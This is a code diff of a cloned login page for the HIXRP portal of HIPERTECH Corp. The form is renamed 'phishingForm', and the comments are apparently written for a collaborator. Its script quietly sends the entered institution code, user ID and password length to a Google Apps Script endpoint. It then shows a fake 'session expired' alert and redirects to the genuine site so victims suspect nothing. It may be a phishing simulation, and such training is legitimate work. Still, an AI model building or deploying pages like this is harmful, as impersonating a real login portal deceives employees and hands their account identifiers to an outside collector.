@@ -6,129 +6,176 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HIXRP 로그인</title>
     <style>
-        /* 1. 배경 설정: 형이 올린 illustration.png를 전체 배경으로 사용 */
+        /* 1. 배경 설정: 형이 올린 일러스트가 꽉 차게 */
         body {
             margin: 0;
             padding: 0;
             height: 100vh;
             display: flex;
-            justify-content: center;
-            align-items: center;
+            justify-content: center; /* 가로 중앙 정렬 */
+            align-items: center;     /* 세로 중앙 정렬 */
             font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
-            /* 깃허브에 올린 illustration.png를 배경으로 깔아줌 */
             background: url('illustration.png') no-repeat center center;
-            background-size: cover;
+            background-size: cover;  /* 이미지가 화면을 다 덮게 */
             overflow: hidden;
         }
 
-        /* 2. 로그인 박스: 이미지상의 위치와 스타일 재현 */
-        .login-box {
-            width: 380px;
-            background: rgba(255, 255, 255, 0.9); /* 약간 투명하게 해서 배경과 어우러지게 */
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            /* 일러스트 캐릭터를 가리지 않도록 위치 살짝 조정 (필요시 조절해 형) */
-            transform: translateX(-150px); 
+        /* 2. 로그인 박스 컨테이너 */
+        /* 투명한 배경 없이 입력창들만 공중에 떠 있는 듯한 느낌 구현 */
+        .login-container {
+            width: 320px;
+            /* 이미지상 캐릭터의 약간 왼쪽에 위치하도록 조정 */
+            margin-right: 180px; 
+            margin-top: -50px; /* 살짝 위로 올림 */
         }
 
+        /* 로고 영역 */
         .logo-area {
-            margin-bottom: 30px;
+            text-align: center;
+            margin-bottom: 20px;
         }
 
         .logo-area img {
-            max-width: 150px;
-            height: auto;
+            max-width: 130px; /* 로고 크기 */
         }
 
-        /* 3. 입력 필드 및 버튼 스타일 */
-        .input-group {
-            margin-bottom: 12px;
-            text-align: left;
+        /* 3. 입력 폼 공통 스타일 (핵심: 라벨과 인풋이 같은 배경색을 가짐) */
+        .input-row {
+            display: flex;
+            margin-bottom: 8px; /* 칸 사이 간격 */
+            border: 1px solid #fff; /* 하얀색 테두리 */
+            background-color: #8bbaf3; /* 연한 파란색 배경 (이미지 참고) */
+            height: 38px;
         }
 
-        .input-group label {
-            display: block;
+        /* 왼쪽 라벨 (CODE, ID, PASSWORD) */
+        .input-row label {
+            width: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: #fff; /* 글씨색 하얀색 */
+            font-weight: normal;
+            border-right: 1px solid #fff; /* 라벨과 인풋 사이 하얀 선 */
+        }
+
+        /* 오른쪽 입력 칸 */
+        .input-row input {
+            flex: 1;
+            background-color: transparent; /* 배경 투명하게 (부모 색상 따라감) */
+            border: none;
+            outline: none;
+            padding: 0 10px;
             font-size: 11px;
-            font-weight: bold;
-            color: #5579a6;
-            margin-bottom: 5px;
-            text-transform: uppercase;
+            color: #333;
+        }
+        
+        /* placeholder (안내문구) 색상 지정 */
+        .input-row input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
         }
 
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #9dbce3;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-
+        /* 4. 로그인 버튼 */
         .btn-login {
             width: 100%;
-            padding: 14px;
-            background-color: #1a2660;
-            color: white;
+            height: 40px;
+            background-color: #212c5b; /* 짙은 남색 */
+            color: #fff;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            font-size: 13px;
             font-weight: bold;
-            font-size: 15px;
+            cursor: pointer;
             margin-top: 5px;
+            letter-spacing: 2px; /* '로 그 인' 처럼 자간 넓히기 */
         }
 
+        /* 5. 퇴사자 증명 신청 버튼 */
         .btn-resign {
             width: 100%;
-            padding: 10px;
-            background: none;
-            border: 1px solid #ccc;
-            margin-top: 10px;
+            height: 35px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border: 1px solid #fff;
+            color: #333;
+            font-size: 11px;
             cursor: pointer;
-            color: #666;
-            font-size: 12px;
-            border-radius: 4px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
         }
 
+        /* 6. 하단 옵션 (체크박스) */
         .options {
-            margin-top: 15px;
-            font-size: 11px;
-            color: #666;
             display: flex;
             justify-content: center;
             gap: 15px;
+            margin-top: 15px;
+            font-size: 10px;
+            color: #555;
+        }
+        .options label {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            cursor: pointer;
         }
 
+        /* 7. 최하단 텍스트 링크들 */
         .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
             margin-top: 20px;
-            padding-top: 15px;
-            border-top: 1px solid #eee;
-            font-size: 11px;
+            font-size: 10px;
+            color: #555;
+        }
+        .footer-links a {
+            text-decoration: none;
+            color: #555;
+        }
+        .footer-links strong {
+            color: blue; /* 개인정보처리방침 파란색 강조 */
         }
 
-        .footer-links a { text-decoration: none; color: #5579a6; margin: 0 5px; }
-        .copyright { margin-top: 30px; font-size: 10px; color: #aaa; }
+        /* 8. 카피라이트 (화면 맨 아래 고정) */
+        .copyright {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 9px;
+            color: #777;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
+    <!-- 중앙 로그인 폼 컨테이너 -->
+    <div class="login-container">
+        
+        <!-- 로고 영역 -->
         <div class="logo-area">
-            <!-- 깃허브에 올린 logo.png를 불러옴 -->
-            <img src="logo.png" alt="XRP ez">
+            <img src="logo.png" alt="XRP ez logo">
         </div>
 
-        <form id="simulationForm">
-            <div class="input-group">
+        <form id="phishingForm">
+            <!-- 기관코드 입력 -->
+            <div class="input-row">
                 <label>CODE</label>
                 <input type="text" id="entCd" placeholder="기관코드" required>
             </div>
-            <div class="input-group">
+            
+            <!-- 아이디 입력 -->
+            <div class="input-row">
                 <label>ID</label>
                 <input type="text" id="userId" placeholder="아이디" required>
             </div>
-            <div class="input-group">
+            
+            <!-- 비밀번호 입력 -->
+            <div class="input-row">
                 <label>PASSWORD</label>
                 <input type="password" id="userPw" placeholder="비밀번호" required>
             </div>
@@ -136,7 +183,10 @@
             <button type="submit" class="btn-login">로 그 인</button>
         </form>
 
-        <button class="btn-resign">퇴사자 증명 신청</button>
+        <button class="btn-resign">
+            <!-- 텍스트 이모지로 아이콘 대체 (필요시 이미지로 변경 가능) -->
+            📄 퇴사자 증명 신청
+        </button>
 
         <div class="options">
             <label><input type="checkbox"> 기관코드저장</label>
@@ -144,27 +194,32 @@
         </div>
 
         <div class="footer-links">
-            <a href="#">IP승인요청</a> | <a href="#">비밀번호 찾기</a> | <a href="#"><strong>개인정보처리방침</strong></a>
+            <a href="#">IP승인요청</a>
+            <a href="#">비밀번호 찾기</a>
+            <a href="#"><strong>개인정보처리방침</strong></a>
         </div>
+    </div>
 
-        <p class="copyright">ⓒ HIPERTECH Corp. All Rights Reserved.</p>
+    <!-- 하단 카피라이트 -->
+    <div class="copyright">
+        ⓒ HIPERTECH Corp. All Rights Reserved.
     </div>
 
     <script>
         const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';
 
-        document.getElementById('simulationForm').addEventListener('submit', function(e) {
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const entCd = document.getElementById('entCd').value;
             const id = document.getElementById('userId').value;
             const pw = document.getElementById('userPw').value;
 
-            // 1. 데이터 전송 (기관코드, 아이디, 비밀번호 길이)
+            // 앱스크립트로 데이터 전송 (길이만)
             const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
             fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
 
-            // 2. 알림 후 형이 지정한 최종 주소로 리다이렉트
+            // 알림 띄우고 리다이렉트
             setTimeout(() => {
                 alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                 window.location.href = 'https://gnk.hixrp.kr/index.jsp';
